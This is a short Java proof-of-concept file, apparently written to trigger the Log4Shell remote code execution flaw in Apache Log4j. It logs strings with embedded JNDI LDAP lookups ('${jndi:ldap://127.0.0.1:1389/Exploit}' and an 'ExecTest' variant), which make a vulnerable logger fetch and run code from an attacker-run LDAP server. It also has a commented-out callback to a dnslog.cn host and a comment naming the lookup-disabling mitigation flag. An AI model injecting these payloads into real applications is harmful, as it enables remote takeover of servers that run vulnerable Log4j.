import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LogRCE {
    private static final Logger logger = LogManager.getLogger(LogRCE.class);

    public static void main(String[] args) {
        String poc = "${jndi:ldap://127.0.0.1:1389/Exploit}";
//      ${jndi:ldap://pn48a0.dnslog.cn/Exploit}
        logger.info("sdfdsf${jndi:ldap://127.0.0.1:1389/ExecTest}");
//        -Dlog4j2.formatMsgNoLookups=true
    }
}
